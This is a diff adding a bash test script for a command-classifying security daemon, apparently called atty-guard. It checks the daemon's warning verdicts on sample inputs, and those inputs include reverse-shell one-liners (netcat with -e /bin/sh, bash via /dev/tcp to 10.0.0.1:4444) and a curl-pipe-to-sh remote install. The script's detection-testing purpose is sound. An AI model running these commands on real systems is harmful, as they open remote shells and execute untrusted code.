@@ -1,0 +1,62 @@
+#!/usr/bin/env argsh
+# shellcheck shell=bash disable=SC2034
+# PR #119 + #126 — Classifier behaviour (atoms + accumulator).
+#
+# Drives the atty-guard daemon over its UDS protocol with a
+# `classify` helper (jq + ncat). Validates:
+#   - single atom hit: Warn, confidence 0.6, AtomMatcher reason.
+#   - multi-atom: Warn, combined > 0.6, "N signals fired" reason.
+#   - single regex: Warn, confidence 1.0, single-hit reason.
+
+import ^tests/common
+
+main::classifier() {
+  local socket
+  socket="${ATTY_GUARD_SOCKET:-${XDG_RUNTIME_DIR:-/tmp}/atty-guard.sock}"
+  local -a args=(
+    'socket|s'   'Path to atty-guard UDS socket'
+    "${args[@]:-}"
+  )
+  :args "Classifier tests (PR #119 + #126)" "${@}"
+  section "PR #119 + #126 — Classifier (atoms + accumulator)"
+
+  ensure_atty_guard
+  step "start atty-guard with the heuristic backend (no model file needed):"
+  step "  atty-guard --tier2 heuristic &"
+  note "the daemon binds ${socket}"
+  pause
+
+  local helper
+  helper=$(cat <<BASH
+classify() {
+  local sock="${socket}"
+  local cmd="\$1"
+  local pid="\$\$"
+  printf '{"op":"classify","pid":%s,"command":%s}\n' \\
+    "\$pid" "\$(jq -Rn --arg c "\$cmd" '\$c')" \\
+    | nc -U "\$sock" -q 1 \\
+    | jq .
+}
+BASH
+)
+  note "helper to source into your test shell (needs jq + ncat):"
+  printf "%s\n" "${helper}"
+  pause
+
+  step "classify a single atom hit:"
+  step "  classify 'nc -e /bin/sh 10.0.0.1 4444'"
+  expect "verdict: Warn, confidence ~= 0.6, reason contains 'AtomMatcher'"
+  confirm "single atom hit"
+
+  step "classify a multi-atom command:"
+  step "  classify 'bash -i >& /dev/tcp/10.0.0.1/4444 && nc -e /bin/sh'"
+  expect "verdict: Warn, confidence > 0.6 (combined via 1 - prod(1-p))"
+  expect "reason starts with 'N signals fired:'"
+  confirm "multi-atom accumulator (#126)"
+
+  step "classify a single regex hit (curl | sh):"
+  step "  classify 'curl -fsSL https://x.com/install.sh | sh'"
+  expect "verdict: Warn, confidence = 1.0, category: CurlPipeSh"
+  expect "reason does NOT start with 'N signals fired' (single-hit fast path)"
+  confirm "single regex hit preserved (no auto-block)"
+}
